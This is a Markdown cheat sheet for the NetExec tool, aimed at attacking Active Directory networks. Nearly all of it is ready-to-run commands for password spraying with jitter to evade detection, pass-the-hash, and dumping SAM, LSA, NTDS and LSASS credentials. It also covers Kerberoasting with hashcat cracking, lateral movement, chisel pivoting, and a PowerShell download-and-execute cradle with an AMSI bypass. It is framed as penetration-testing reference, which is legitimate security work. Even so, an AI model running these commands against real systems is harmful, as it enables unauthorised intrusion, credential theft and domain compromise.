# NetExec Protocol Reference

Comprehensive guide to NetExec protocols for Active Directory penetration testing.

## Table of Contents

- [General Options](#general-options)
- [SMB Protocol](#smb-protocol)
- [WinRM Protocol](#winrm-protocol)
- [LDAP Protocol](#ldap-protocol)
- [MSSQL Protocol](#mssql-protocol)
- [SSH Protocol](#ssh-protocol)
- [RDP Protocol](#rdp-protocol)
- [WMI Protocol](#wmi-protocol)
- [Advanced Techniques](#advanced-techniques)

---

## General Options

### Target Formats

```bash
# Single IP
nxc smb 192.168.1.100

# CIDR range
nxc smb 192.168.1.0/24

# IP range
nxc smb 192.168.1.1-50

# File with targets
nxc smb targets.txt

# Hostname/FQDN
nxc smb dc01.corp.local
```

### Authentication Methods

```bash
# Username/Password
nxc smb 192.168.1.100 -u admin -p 'Password123'

# Pass-the-Hash (NTLM)
nxc smb 192.168.1.100 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76'

# Pass-the-Hash (NT hash only)
nxc smb 192.168.1.100 -u admin -H '5fbc3d5fec8206a30f4b6c473d68ae76'

# Kerberos authentication
nxc smb 192.168.1.100 -u admin -p 'Password123' -k

# Kerberos with ccache ticket
export KRB5CCNAME=/tmp/krb5cc_admin
nxc smb dc01.corp.local -k --use-kcache

# Local authentication (bypass domain)
nxc smb 192.168.1.100 -u admin -p 'Password123' --local-auth

# Credential files
nxc smb 192.168.1.100 -u users.txt -p passwords.txt
```

### Common Global Options

```bash
--threads THREADS      # Number of concurrent threads (default: 100)
--timeout TIMEOUT      # Connection timeout in seconds
--jitter INTERVAL      # Random delay between operations (e.g., "1-5")
--no-bruteforce        # Don't spray across multiple targets
--continue-on-success  # Continue after successful auth
--log FILE             # Log output to file
-d DOMAIN              # Specify domain
--kdcHost KDC          # Specify KDC for Kerberos
```

---

## SMB Protocol

**Port:** 445/TCP

SMB is the primary protocol for Windows network operations and the most feature-rich protocol in NetExec.

### Basic Authentication Check

```bash
# Check credentials - output indicates success/failure
nxc smb 192.168.1.100 -u admin -p 'Password123'

# Output interpretation:
# [+] = Success (Pwn3d! = admin access)
# [-] = Failed
# [*] = Info
```

### Enumeration

#### Host Information

```bash
# Get hostname, domain, OS version
nxc smb 192.168.1.0/24

# Signing status (important for relay attacks)
nxc smb 192.168.1.0/24 --gen-relay-list unsigned.txt
```

#### Share Enumeration

```bash
# List shares
nxc smb 192.168.1.100 -u user -p 'Password123' --shares

# Spider shares for files
nxc smb 192.168.1.100 -u user -p 'Password123' --spider C$ --pattern txt,xlsx,docx

# Spider with regex
nxc smb 192.168.1.100 -u user -p 'Password123' --spider SYSVOL --regex password

# Get specific file
nxc smb 192.168.1.100 -u user -p 'Password123' --get-file 'C:\Users\admin\Desktop\secret.txt' secret.txt

# Put file on share
nxc smb 192.168.1.100 -u admin -p 'Password123' --put-file payload.exe 'C:\Windows\Temp\payload.exe'
```

#### User Enumeration

```bash
# Enumerate logged-on users
nxc smb 192.168.1.100 -u admin -p 'Password123' --loggedon-users

# Enumerate local users
nxc smb 192.168.1.100 -u admin -p 'Password123' --users

# Enumerate local groups
nxc smb 192.168.1.100 -u admin -p 'Password123' --groups

# RID brute-force (find users without auth)
nxc smb 192.168.1.100 -u '' -p '' --rid-brute

# RID brute with range
nxc smb 192.168.1.100 -u guest -p '' --rid-brute 10000
```

#### Session Enumeration

```bash
# Enumerate active sessions
nxc smb 192.168.1.100 -u admin -p 'Password123' --sessions

# Enumerate disk space
nxc smb 192.168.1.100 -u admin -p 'Password123' --disks
```

### Password Spraying

```bash
# Single password against multiple users
nxc smb 192.168.1.100 -u users.txt -p 'Spring2025!' --continue-on-success

# Multiple passwords (be careful - lockout!)
nxc smb 192.168.1.100 -u users.txt -p passwords.txt --no-bruteforce

# With jitter to avoid detection
nxc smb 192.168.1.0/24 -u users.txt -p 'Password1' --jitter 2-5
```

### Command Execution

```bash
# Execute via wmiexec (default)
nxc smb 192.168.1.100 -u admin -p 'Password123' -x 'whoami /all'

# Execute via smbexec
nxc smb 192.168.1.100 -u admin -p 'Password123' -x 'whoami' --exec-method smbexec

# Execute via atexec (scheduled task)
nxc smb 192.168.1.100 -u admin -p 'Password123' -x 'whoami' --exec-method atexec

# Execute via mmcexec
nxc smb 192.168.1.100 -u admin -p 'Password123' -x 'whoami' --exec-method mmcexec

# PowerShell execution
nxc smb 192.168.1.100 -u admin -p 'Password123' -X 'Get-Process'

# Execute and bypass AMSI
nxc smb 192.168.1.100 -u admin -p 'Password123' -X 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10/script.ps1")' --amsi-bypass /path/to/bypass.ps1
```

### Credential Dumping

```bash
# Dump SAM database (local accounts)
nxc smb 192.168.1.100 -u admin -p 'Password123' --sam

# Dump LSA secrets
nxc smb 192.168.1.100 -u admin -p 'Password123' --lsa

# Dump NTDS.dit (Domain Controller only - EXTREMELY NOISY)
nxc smb dc01.corp.local -u domainadmin -p 'Password123' --ntds

# NTDS with VSS (Volume Shadow Copy)
nxc smb dc01.corp.local -u domainadmin -p 'Password123' --ntds vss

# Dump cached credentials
nxc smb 192.168.1.100 -u admin -p 'Password123' --dpapi

# Dump LSASS (requires administrative access)
nxc smb 192.168.1.100 -u admin -p 'Password123' -M lsassy

# Dump LSASS with procdump
nxc smb 192.168.1.100 -u admin -p 'Password123' -M procdump
```

### LAPS (Local Administrator Password Solution)

```bash
# Read LAPS password (requires proper permissions)
nxc smb 192.168.1.100 -u user -p 'Password123' --laps

# LAPS with specific LAPS password attribute
nxc smb 192.168.1.100 -u user -p 'Password123' -M laps
```

### Service Enumeration

```bash
# Check for Spooler service (PrintNightmare)
nxc smb 192.168.1.0/24 -u user -p 'Password123' -M spooler

# Check for WebDAV (Coerce attacks)
nxc smb 192.168.1.0/24 -u user -p 'Password123' -M webdav
```

### Generate Configuration Files

```bash
# Generate hosts file entries
nxc smb 192.168.1.0/24 --gen-hosts-file hosts.txt

# Generate krb5.conf
nxc smb dc01.corp.local -u user -p 'Password123' --gen-krb5-conf krb5.conf
```

---

## WinRM Protocol

**Ports:** 5985/TCP (HTTP), 5986/TCP (HTTPS)

WinRM provides PowerShell remoting capabilities. Requires membership in "Remote Management Users" group or administrative access.

### Authentication

```bash
# Check WinRM access
nxc winrm 192.168.1.100 -u admin -p 'Password123'

# Pass-the-Hash
nxc winrm 192.168.1.100 -u admin -H '5fbc3d5fec8206a30f4b6c473d68ae76'

# Kerberos
nxc winrm dc01.corp.local -u admin -p 'Password123' -k

# Local auth
nxc winrm 192.168.1.100 -u admin -p 'Password123' --local-auth

# SSL/HTTPS
nxc winrm 192.168.1.100 -u admin -p 'Password123' --ssl
```

### Password Spraying

```bash
# Spray against WinRM
nxc winrm 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# WinRM with domain
nxc winrm 192.168.1.0/24 -u users.txt -p 'Password123' -d corp.local
```

### Command Execution

```bash
# Execute PowerShell command
nxc winrm 192.168.1.100 -u admin -p 'Password123' -x 'whoami'

# Execute with arguments
nxc winrm 192.168.1.100 -u admin -p 'Password123' -x 'Get-Process | Select-Object -First 5'

# Execute CMD command (not PowerShell)
nxc winrm 192.168.1.100 -u admin -p 'Password123' -X 'cmd /c dir C:\'

# Load PowerShell script
nxc winrm 192.168.1.100 -u admin -p 'Password123' -x '$script = [System.IO.File]::ReadAllText("C:\script.ps1"); IEX $script'
```

### Credential Dumping

```bash
# Dump SAM
nxc winrm 192.168.1.100 -u admin -p 'Password123' --sam

# Dump LSA
nxc winrm 192.168.1.100 -u admin -p 'Password123' --lsa

# LAPS password
nxc winrm 192.168.1.100 -u user -p 'Password123' --laps
```

---

## LDAP Protocol

**Ports:** 389/TCP (LDAP), 636/TCP (LDAPS), 3268/TCP (Global Catalog)

LDAP is essential for Active Directory enumeration and exploitation.

### Authentication

```bash
# Simple bind
nxc ldap dc01.corp.local -u user -p 'Password123'

# LDAPS (SSL)
nxc ldap dc01.corp.local -u user -p 'Password123' --ssl

# Anonymous bind (if allowed)
nxc ldap dc01.corp.local -u '' -p ''

# Pass-the-Hash
nxc ldap dc01.corp.local -u admin -H '5fbc3d5fec8206a30f4b6c473d68ae76'

# Kerberos
nxc ldap dc01.corp.local -u user -p 'Password123' -k
```

### Domain Enumeration

```bash
# Enumerate users
nxc ldap dc01.corp.local -u user -p 'Password123' --users

# Enumerate groups
nxc ldap dc01.corp.local -u user -p 'Password123' --groups

# Get user descriptions (often contain passwords!)
nxc ldap dc01.corp.local -u user -p 'Password123' --user-desc

# Enumerate computers
nxc ldap dc01.corp.local -u user -p 'Password123' --computers

# Get domain SID
nxc ldap dc01.corp.local -u user -p 'Password123' --get-sid

# Check password policy
nxc ldap dc01.corp.local -u user -p 'Password123' --pass-pol

# Machine Account Quota (can you add computers?)
nxc ldap dc01.corp.local -u user -p 'Password123' -M maq
```

### Kerberoasting

```bash
# Find kerberoastable accounts and get TGS tickets
nxc ldap dc01.corp.local -u user -p 'Password123' --kerberoasting output.txt

# Kerberoast specific user
nxc ldap dc01.corp.local -u user -p 'Password123' --kerberoasting output.txt --kerberoast-user svc_sql
```

### AS-REP Roasting

```bash
# Find AS-REP roastable accounts (no preauth)
nxc ldap dc01.corp.local -u user -p 'Password123' --asreproast output.txt

# AS-REP roast without authentication (enumerate first)
nxc ldap dc01.corp.local -u '' -p '' --asreproast output.txt
```

### Delegation Attacks

```bash
# Find unconstrained delegation
nxc ldap dc01.corp.local -u user -p 'Password123' --trusted-for-delegation

# Find constrained delegation
nxc ldap dc01.corp.local -u user -p 'Password123' -M find-delegation

# Admin count (protected users)
nxc ldap dc01.corp.local -u user -p 'Password123' --admin-count
```

### gMSA Exploitation

```bash
# Find gMSA accounts
nxc ldap dc01.corp.local -u user -p 'Password123' --gmsa

# Dump gMSA password (requires permission)
nxc ldap dc01.corp.local -u user -p 'Password123' --gmsa-convert-id <id>

# Decrypt gMSA password
nxc ldap dc01.corp.local -u user -p 'Password123' --gmsa-decrypt-lsa <blob>
```

### LDAP Signing

```bash
# Check if LDAP signing is enforced
nxc ldap dc01.corp.local -u user -p 'Password123' -M ldap-checker

# Check channel binding
nxc ldap dc01.corp.local -u user -p 'Password123' --check-ldap-signing
```

### BloodHound Integration

```bash
# Full BloodHound collection
nxc ldap dc01.corp.local -u user -p 'Password123' --bloodhound -c All

# Specific collection methods
nxc ldap dc01.corp.local -u user -p 'Password123' --bloodhound -c DCOnly

# Collection options: Default, All, DCOnly, Session, LoggedOn, ACL, Trusts, ObjectProps, Container
nxc ldap dc01.corp.local -u user -p 'Password123' --bloodhound -c Session,LoggedOn

# Output to specific directory
nxc ldap dc01.corp.local -u user -p 'Password123' --bloodhound -c All --bloodhound-output /tmp/bh
```

### Trust Enumeration

```bash
# Enumerate domain trusts
nxc ldap dc01.corp.local -u user -p 'Password123' --trusts

# Get DCs in trusted domains
nxc ldap dc01.corp.local -u user -p 'Password123' -M dc-list
```

### ADCS Exploitation

```bash
# Find ADCS (Certificate Services)
nxc ldap dc01.corp.local -u user -p 'Password123' -M adcs

# Enumerate certificates
nxc ldap dc01.corp.local -u user -p 'Password123' -M certify
```

### Custom LDAP Queries

```bash
# Custom LDAP filter
nxc ldap dc01.corp.local -u user -p 'Password123' --query "(servicePrincipalName=*)" "sAMAccountName,servicePrincipalName"

# Find disabled accounts
nxc ldap dc01.corp.local -u user -p 'Password123' --query "(userAccountControl:1.2.840.113556.1.4.803:=2)" "sAMAccountName"
```

---

## MSSQL Protocol

**Port:** 1433/TCP

MSSQL attacks are valuable for lateral movement and privilege escalation in AD environments.

### Authentication

```bash
# SQL Server authentication
nxc mssql 192.168.1.100 -u sa -p 'Password123'

# Windows authentication (domain)
nxc mssql 192.168.1.100 -u admin -p 'Password123' -d corp.local --windows-auth

# Local Windows auth
nxc mssql 192.168.1.100 -u admin -p 'Password123' --local-auth --windows-auth
```

### Password Spraying

```bash
# Spray SQL auth
nxc mssql 192.168.1.0/24 -u users.txt -p 'Password123'

# Spray Windows auth
nxc mssql 192.168.1.0/24 -u users.txt -p 'Password123' -d corp.local --windows-auth --continue-on-success
```

### Enumeration

```bash
# Get server info
nxc mssql 192.168.1.100 -u sa -p 'Password123' --info

# Enumerate databases
nxc mssql 192.168.1.100 -u sa -p 'Password123' --databases

# Run SQL query
nxc mssql 192.168.1.100 -u sa -p 'Password123' -q "SELECT name FROM sys.databases"

# Enumerate users via RID brute-force
nxc mssql 192.168.1.100 -u sa -p 'Password123' --rid-brute
```

### Command Execution

```bash
# Enable and use xp_cmdshell
nxc mssql 192.168.1.100 -u sa -p 'Password123' -x 'whoami'

# Execute without enabling xp_cmdshell (if already enabled)
nxc mssql 192.168.1.100 -u sa -p 'Password123' -x 'whoami' --no-enable

# Execute PowerShell
nxc mssql 192.168.1.100 -u sa -p 'Password123' -X 'Get-Process'
```

### Privilege Escalation

```bash
# Check for impersonation rights
nxc mssql 192.168.1.100 -u user -p 'Password123' -M mssql_priv

# Impersonate user
nxc mssql 192.168.1.100 -u user -p 'Password123' -x 'whoami' --impersonate sa

# Linked server attacks
nxc mssql 192.168.1.100 -u sa -p 'Password123' -q "SELECT * FROM sys.servers"
```

### File Operations

```bash
# Download file
nxc mssql 192.168.1.100 -u sa -p 'Password123' --get-file 'C:\secret.txt' secret.txt

# Upload file
nxc mssql 192.168.1.100 -u sa -p 'Password123' --put-file payload.exe 'C:\Windows\Temp\payload.exe'
```

---

## SSH Protocol

**Port:** 22/TCP

SSH support for attacking Linux systems in mixed environments.

### Authentication

```bash
# Password auth
nxc ssh 192.168.1.100 -u root -p 'Password123'

# Key-based auth
nxc ssh 192.168.1.100 -u root --key-file /path/to/id_rsa

# Key with passphrase
nxc ssh 192.168.1.100 -u root --key-file id_rsa --key-passphrase 'keypass'
```

### Password Spraying

```bash
# Spray passwords
nxc ssh 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Spray with timeout
nxc ssh 192.168.1.0/24 -u root -p passwords.txt --timeout 5
```

### Command Execution

```bash
# Execute command
nxc ssh 192.168.1.100 -u root -p 'Password123' -x 'id'

# Execute multiple commands
nxc ssh 192.168.1.100 -u root -p 'Password123' -x 'uname -a && cat /etc/passwd'

# Get sudo access
nxc ssh 192.168.1.100 -u user -p 'Password123' -x 'sudo whoami' --sudo
```

### File Operations

```bash
# Download file
nxc ssh 192.168.1.100 -u root -p 'Password123' --get-file /etc/shadow shadow.txt

# Upload file
nxc ssh 192.168.1.100 -u root -p 'Password123' --put-file linpeas.sh /tmp/linpeas.sh
```

---

## RDP Protocol

**Port:** 3389/TCP

RDP support focuses on authentication checking and brute-forcing.

### Authentication Check

```bash
# Check RDP access
nxc rdp 192.168.1.100 -u admin -p 'Password123'

# Check NLA status
nxc rdp 192.168.1.100 -u admin -p 'Password123' --nla
```

### Password Spraying

```bash
# Spray RDP
nxc rdp 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Spray with domain
nxc rdp 192.168.1.0/24 -u users.txt -p 'Password123' -d corp.local
```

### Screenshots

```bash
# Take screenshot (requires active session)
nxc rdp 192.168.1.100 -u admin -p 'Password123' --screenshot

# Screenshot without NLA
nxc rdp 192.168.1.100 -u admin -p 'Password123' --screenshot-nla
```

### Command Execution

```bash
# Execute command via RDP
nxc rdp 192.168.1.100 -u admin -p 'Password123' -x 'whoami'
```

---

## WMI Protocol

**Port:** 135/TCP (RPC Endpoint Mapper)

WMI provides stealthy execution through Windows Management Instrumentation.

### Authentication

```bash
# Check WMI access
nxc wmi 192.168.1.100 -u admin -p 'Password123'

# Pass-the-Hash
nxc wmi 192.168.1.100 -u admin -H '5fbc3d5fec8206a30f4b6c473d68ae76'

# Kerberos
nxc wmi dc01.corp.local -u admin -p 'Password123' -k
```

### Password Spraying

```bash
# Spray WMI
nxc wmi 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
```

### Command Execution

```bash
# Execute command
nxc wmi 192.168.1.100 -u admin -p 'Password123' -x 'whoami'

# Execute PowerShell
nxc wmi 192.168.1.100 -u admin -p 'Password123' -X 'Get-Process'
```

---

## Advanced Techniques

### Password Spraying Best Practices

```bash
# 1. Get password policy first
nxc ldap dc01.corp.local -u user -p 'Password123' --pass-pol

# 2. Enumerate users
nxc ldap dc01.corp.local -u user -p 'Password123' --users > users.txt

# 3. Spray with caution (respect lockout threshold)
# If lockout is 5 attempts, spray 2-3 at most per lockout window
nxc smb 192.168.1.0/24 -u users.txt -p 'Spring2025!' --continue-on-success --jitter 1-3

# 4. Try across multiple protocols
nxc winrm 192.168.1.0/24 -u users.txt -p 'Spring2025!' --continue-on-success
nxc rdp 192.168.1.0/24 -u users.txt -p 'Spring2025!' --continue-on-success
```

### Credential Dumping Chain

```bash
# Step 1: Dump local credentials
nxc smb target -u admin -p 'Password123' --sam --lsa

# Step 2: Use obtained hash for lateral movement
nxc smb 192.168.1.0/24 -u localadmin -H '<ntlm_hash>' --continue-on-success

# Step 3: On DC - dump domain credentials
nxc smb dc01.corp.local -u domainadmin -H '<ntlm_hash>' --ntds

# Using lsassy module (more stealth)
nxc smb target -u admin -p 'Password123' -M lsassy
```

### Kerberos Attack Chain

```bash
# Step 1: Get Kerberoastable accounts
nxc ldap dc01.corp.local -u user -p 'Password123' --kerberoasting kerberoast.txt

# Step 2: Crack with hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt

# Step 3: AS-REP Roast accounts with no preauth
nxc ldap dc01.corp.local -u user -p 'Password123' --asreproast asrep.txt

# Step 4: Crack AS-REP hashes
hashcat -m 18200 asrep.txt wordlist.txt
```

### Using with Proxychains

```bash
# Configure /etc/proxychains.conf
# socks4 127.0.0.1 1080

# Run through proxy
proxychains nxc smb 10.10.10.0/24 -u user -p 'Password123' --shares

# With SOCKS5
proxychains -f /etc/proxychains4.conf nxc ldap 10.10.10.100 -u user -p 'Password123' --users

# Chisel tunnel example
# On attack box: chisel server -p 8080 --reverse
# On pivot: chisel client 10.10.10.10:8080 R:1080:socks
proxychains nxc smb 172.16.1.0/24 -u admin -p 'Password123'
```

### Module Usage

```bash
# List all modules
nxc smb -L
nxc ldap -L
nxc winrm -L

# Module help
nxc smb -M lsassy --options

# Common modules:
# SMB modules
nxc smb target -u admin -p pass -M lsassy              # Dump LSASS
nxc smb target -u admin -p pass -M procdump            # Dump LSASS via procdump
nxc smb target -u admin -p pass -M nanodump            # Dump LSASS via nanodump
nxc smb target -u admin -p pass -M mimikatz            # Run Mimikatz
nxc smb target -u admin -p pass -M spooler             # Check print spooler
nxc smb target -u admin -p pass -M webdav              # Check WebDAV
nxc smb target -u admin -p pass -M gpp_password        # Find GPP passwords
nxc smb target -u admin -p pass -M gpp_autologin       # Find autologin GPP
nxc smb target -u admin -p pass -M keepass_discover    # Find KeePass databases
nxc smb target -u admin -p pass -M keepass_trigger     # Exploit KeePass trigger
nxc smb target -u admin -p pass -M veeam               # Dump Veeam creds
nxc smb target -u admin -p pass -M teams_localdb       # Dump Teams tokens

# LDAP modules
nxc ldap dc -u user -p pass -M adcs                    # Find ADCS
nxc ldap dc -u user -p pass -M maq                     # Machine Account Quota
nxc ldap dc -u user -p pass -M ldap-checker            # LDAP signing check
nxc ldap dc -u user -p pass -M find-delegation        # Find delegation

# Module with options
nxc smb target -u admin -p pass -M lsassy -o METHOD=comsvcs
```

### Database Operations

```bash
# View stored credentials
nxc -h  # Shows database path

# Use nxcdb for database queries
nxcdb

# Inside nxcdb:
# hosts       - View discovered hosts
# creds       - View stored credentials
# export      - Export data
```

### Combining Techniques

```bash
# Full domain enumeration workflow
# 1. Enumerate hosts
nxc smb 192.168.1.0/24 --gen-relay-list unsigned.txt

# 2. Check null sessions
nxc smb 192.168.1.0/24 -u '' -p '' --shares

# 3. RID brute-force for users
nxc smb dc01.corp.local -u '' -p '' --rid-brute | tee rid_users.txt

# 4. Password spray
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# 5. With valid creds - full enumeration
nxc ldap dc01.corp.local -u user -p 'Password123' --users --groups --pass-pol
nxc ldap dc01.corp.local -u user -p 'Password123' --kerberoasting kerb.txt
nxc ldap dc01.corp.local -u user -p 'Password123' --asreproast asrep.txt
nxc ldap dc01.corp.local -u user -p 'Password123' --bloodhound -c All

# 6. With admin access - credential dump
nxc smb targets.txt -u admin -p 'Password123' --sam --lsa
nxc smb dc01.corp.local -u domadmin -p 'Password123' --ntds
```

### OPSEC Considerations

```bash
# Use --jitter to randomize timing
nxc smb 192.168.1.0/24 -u user -p pass --jitter 1-5

# Reduce threads to avoid detection
nxc smb 192.168.1.0/24 -u user -p pass --threads 5

# Audit mode (don't execute, just check)
nxc smb 192.168.1.100 -u admin -p 'Password123' --audit-mode

# Ignore OPSEC warnings
nxc smb 192.168.1.100 -u admin -p 'Password123' --ignore-opsec
```

---

## Output Interpretation

```
SMB         192.168.1.100  445    DC01    [*] Windows Server 2019 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.1.100  445    DC01    [+] CORP.LOCAL\admin:Password123 (Pwn3d!)
```

- `[*]` - Informational
- `[+]` - Success
- `[-]` - Failure
- `(Pwn3d!)` - Administrative access confirmed

---

## Quick Reference

| Task | Command |
|------|---------|
| Check creds | `nxc smb target -u user -p pass` |
| Spray passwords | `nxc smb targets -u users.txt -p pass --continue-on-success` |
| Dump SAM | `nxc smb target -u admin -p pass --sam` |
| Dump LSA | `nxc smb target -u admin -p pass --lsa` |
| Dump NTDS | `nxc smb dc -u dadmin -p pass --ntds` |
| Kerberoast | `nxc ldap dc -u user -p pass --kerberoasting out.txt` |
| AS-REP Roast | `nxc ldap dc -u user -p pass --asreproast out.txt` |
| BloodHound | `nxc ldap dc -u user -p pass --bloodhound -c All` |
| Execute cmd | `nxc smb target -u admin -p pass -x 'whoami'` |
| List shares | `nxc smb target -u user -p pass --shares` |
| Enumerate users | `nxc ldap dc -u user -p pass --users` |
| Get LAPS | `nxc smb target -u user -p pass --laps` |

---

## References

- Official Wiki: https://netexec.wiki/
- GitHub: https://github.com/Pennyw0rth/NetExec
- BloodHound: https://github.com/BloodHoundAD/BloodHound
